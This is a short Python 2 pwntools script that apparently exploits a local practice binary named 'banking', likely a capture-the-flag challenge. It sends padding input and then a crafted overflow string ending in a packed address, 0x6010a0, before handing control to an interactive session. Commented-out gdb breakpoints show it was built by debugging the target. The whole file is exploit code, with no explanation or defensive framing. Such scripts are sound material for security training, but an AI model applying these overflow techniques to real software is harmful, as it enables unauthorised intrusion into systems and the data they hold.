#!/usr/bin/env python

from pwn import *

NAME = 0x6010a0

r = process("./banking")
# gdb.attach(r)
raw_input("go?")
# gdb.attach(r, '''
# 	b *0x00000000004007d4
# 	c
# 	''')

r.recv()
r.sendline("AAAABBBBCCCCDDDDEEEE")
print r.recv()
r.sendline("1234")
print r.recvuntil("quit")

r.sendline("d")
r.recv()
r.send("AAAABBBBCCCCDDDDEEE" + p32(NAME))
r.interactive()